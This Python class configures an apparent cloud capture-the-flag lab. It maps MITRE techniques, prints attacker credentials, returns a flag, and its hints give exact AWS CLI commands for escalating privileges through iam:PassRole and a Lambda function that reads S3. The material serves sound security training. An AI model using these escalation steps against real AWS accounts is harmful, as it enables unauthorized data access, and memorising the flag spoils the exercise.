from cumulonimbus.providers.base.application_configuration import ApplicationConfigurationAbstract


class ApplicationConfiguration(ApplicationConfigurationAbstract):
    mitre_ttps = [
        {"id": "T1078.004", "name": "Valid Accounts: Cloud Accounts", "url": "https://attack.mitre.org/techniques/T1078/004/"},
        {"id": "T1548", "name": "Abuse Elevation Control Mechanism", "url": "https://attack.mitre.org/techniques/T1548/"},
        {"id": "T1530", "name": "Data from Cloud Storage", "url": "https://attack.mitre.org/techniques/T1530/"},
        {"id": "T1580", "name": "Cloud Infrastructure Discovery", "url": "https://attack.mitre.org/techniques/T1580/"},
    ]
    def configure_application(self, **kwargs):
        pass
    def get_hints(self):
        return {
            1: "Check your IAM permissions: aws iam get-user-policy --user-name <you> --policy-name developer-permissions. Notice iam:PassRole and lambda:CreateFunction together.",
            2: "Create a Lambda function using the privileged role ARN, with a handler that calls boto3 to read from S3. Pass --role <lambda_role_arn> to lambda:CreateFunction.",
            3: "Inline the exploit as a zip: zip lambda.zip lambda_function.py && aws lambda create-function --function-name exploit --runtime python3.9 --role <role_arn> --handler lambda_function.handler --zip-file fileb://lambda.zip && aws lambda invoke --function-name exploit out.txt && cat out.txt",
        }

    def get_flag(self):
        return "CUMULONIMBUS{1AM_Pass_R0l3_L4mbda_Pr1v3sc}"

    def pretty_print_tf_output(self, app_id, output):
        if not output:
            return
        print("###############################################")
        print("#             Required Information            #")
        print("###############################################")
        print("[1] aws_access_key_id     : " + output["attacker_aws_access_key_id"]["value"])
        print("[2] aws_secret_access_key : " + output["attacker_aws_secret_access_key"]["value"])
        print("[3] lambda_role_arn       : " + output["lambda_role_arn"]["value"])
        print("[4] flag_bucket_name      : " + output["flag_bucket_name"]["value"])
        print("")
        print("Configure the attacker profile:")
        print("  aws configure --profile attacker  # enter key id + secret, region: eu-west-1")
        print("  aws iam list-roles --profile attacker  # discover the high-privilege role")
        self.print_mitre_ttps()